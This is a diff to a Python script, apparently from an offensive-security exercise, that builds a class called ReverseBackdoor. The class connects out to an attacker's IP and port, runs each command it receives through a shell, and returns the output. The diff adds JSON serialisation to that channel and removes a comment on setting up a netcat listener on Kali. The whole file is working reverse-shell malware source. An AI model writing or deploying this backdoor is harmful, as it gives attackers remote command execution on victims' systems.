@@ -1,12 +1,10 @@
 #!usr/bin/env python3
+from json.decoder import JSONDecodeError
 import socket
 import subprocess
 import sys
+import json
 
-
-# 1. Create a open port on kali (attackers) machine using netcat
-# $ nc -vv -l -p 4444
-# nc = netcat, -vv=very verbose, -l=listen, -p=port
 
 class ReverseBackdoor:
 	def __init__(self, ip:str, port:int)->None:
@@ -18,25 +16,45 @@ class ReverseBackdoor:
 		self.connection.connect((self.ip,self.port))
 
 
-	def execute_command(self,command:str):
+	def serial_send(self, data:str):
+		'''
+		serialize data and send over TCP socket.
+		'''
+		bytes_json_data = json.dumps(data).encode('utf-8')
+		self.connection.send(bytes_json_data)
+
+
+	def serial_receive(self)->str:
+		'''
+		receive serialized data over TCP socket 
+		and retrieve original data.
+		'''
+		bytes_json_data = self.connection.recv(1024)
+		str_json_data = str(bytes_json_data, encoding='utf-8')
+		data = json.loads(str_json_data)
+		return data
+
+
+	def execute_command(self,command:str)->str:
 		'''
 		executes command and return command's output.
 		'''
-		return subprocess.check_output(command, shell=True)
+		return subprocess.check_output(command, shell=True).decode('utf-8')
 
 
 	def run(self):
 		while True:
 			try:
-				command = self.connection.recv(1024).decode('utf-8')
+				command = self.serial_receive()
 				command_output = self.execute_command(command)
-				self.connection.send(command_output)
+				self.serial_send(command_output)
 
-			except ConnectionResetError:
+			except json.JSONDecodeError:
 				print('[-] Lost Connection.')
 				self.connection.close()
 				sys.exit()
 
 			except Exception as e:
-				exception = ('[-] Exception : ' + str(e)).encode('utf-8')
-				self.connection.send(exception)
+				exception = ('[-] Exception : ' + str(e))
+				self.serial_send(exception)
+
